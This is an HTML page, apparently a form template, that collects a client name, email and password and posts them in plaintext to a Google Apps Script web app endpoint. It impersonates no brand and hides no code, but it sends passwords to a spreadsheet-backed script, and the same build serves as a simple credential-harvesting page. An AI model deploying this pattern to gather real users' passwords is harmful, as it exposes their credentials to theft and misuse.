<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css" />
  </head>
  <body>
    <section class="hero is-primary is-bold">
      <div class="hero-body">
        <div class="container">
          <h1 class="title">Data Submission</h1>
        </div>
      </div>
    </section>

    <form id="form" class="container m-4 pl-4">
      <div class="field">
        <label class="label">Client Name</label>
        <div class="control">
          <input class="input" type="text" placeholder="Your Client Name" name="Client Name" required />
        </div>
      </div>
      <div class="field">
        <label class="label">Email</label>
        <div class="control">
          <input class="input" type="email" placeholder="Your Email" name="Email" required />
        </div>
      </div>
      <div class="field">
        <label class="label">Password</label>
        <div class="control">
          <input class="input" type="password" placeholder="Your Password" name="Password" required />
        </div>
      </div>
      <div class="field is-grouped">
        <div class="control">
          <button class="button is-primary" type="submit">Submit</button>
        </div>
      </div>
    </form>

    <div id="message" style="margin: 20px; font-weight: bold;"></div>

    <script>
      const form = document.getElementById("form");
      const message = document.getElementById("message");

      const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzKjehavT6TXMBhvjQUHeC5Ys04cH1wnuf96dsPk0vqSLbMumlHU2IX0JqgRXngyFdW/exec"; // Replace with your Apps Script URL

      form.addEventListener("submit", function (e) {
        e.preventDefault();
        const formData = new FormData(form);
        const formParams = new URLSearchParams(formData).toString();

        message.textContent = "Submitting...";

        fetch(WEB_APP_URL, {
          method: "POST",
          body: formParams,
          headers: { "Content-Type": "application/x-www-form-urlencoded" }
        })
          .then(response => {
            if (!response.ok) throw new Error("Failed to submit data.");
            return response.text();
          })
          .then(() => {
            message.textContent = "Data submitted successfully!";
            form.reset();
          })
          .catch(error => {
            console.error("Error:", error);
            message.textContent = "Error submitting data.";
          });
      });
    </script>
  </body>
</html>
